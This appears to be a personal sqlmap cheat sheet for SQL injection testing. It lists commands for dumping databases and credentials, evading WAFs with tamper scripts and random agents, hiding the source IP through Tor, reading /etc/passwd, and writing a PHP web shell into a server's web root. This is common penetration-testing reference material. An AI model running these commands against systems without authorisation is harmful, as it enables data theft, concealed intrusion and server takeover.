*Utilize ‘Copy as cURL’ from the Network monitor panel from dev tools. Change the curl command up front to sqlmap and that's your query*

### Good to Know

Dump the data in the terminal:
```CLI
--batch --dump
```

If there no known parameter for SQL you can throw in a command to crawl:
```CLI
--crawl --forms
```

POST requests:
```CLI
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

Long or complex request with multi-line. Copy the request from Burp and save as req.txt:
```CLI
sqlmap -r req.txt
```

Specifying a header (cookie, host, referer, --user-agent)**:
```CLI
sqlmap --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Decoy user agent to try and evade filters:
```CLI
--random-agent
```

JSON or XML formatted requests can also be done with:
```CLI
--data
```

Store traffice with the -t command:
```CLI
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

### Database Enumeration
```txt
-autoenumeration (switch --all --batch)

-Search for table,db, and columns(switch --search -T/C/D <string>

-Structure of the db (switch --schema)

-Database version banner (switch --banner)

-Current user name (switch --current-user)

-Current database name (switch --current-db)

-Database specific credentials, use batch too (switch --passwords)

-Checking if the current user has DBA (administrator) rights (switch --is-dba)

-To show the tables use the tables switch and a -D with db name(switch --tables -D <db_name>

-To dump contents of the tables, use the dump with the tablename and db name (switch --dump -T <table> -D <db_name>

-Specify columns with C (switch -C name, email)

-To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the --start and --stop options (e.g., start from 2nd up to 3rd entry)

-If there is a requirement to retrieve certain rows based on a known WHERE condition (e.g. name LIKE 'f%'), we can use the option --where(switch --where="name LIKE 'f%'")
```


### Bypassing WAF

CSRF Token:
```CLI
--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

Unique Value:
```CLI
--randomize=<parameter that needs unique id>
```

Calculated Parameter Bypass. When something needs to be evaluated before it runs the request like a python script:
```CLI
--eval

--eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

IP Address Concealing:
```CLI
--proxy="socks4://127.0.0.1:9050"

--tor

--check-tor
```

Tamper scripts:
```CLI
--tamper

--list-tampers
```

#### OS Exploitation

Check if user is DBA:
```CLI
--is-dba
```

Read File:
```CLI
--file-read "/etc/passwd"
```

Write File:
```CLI
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
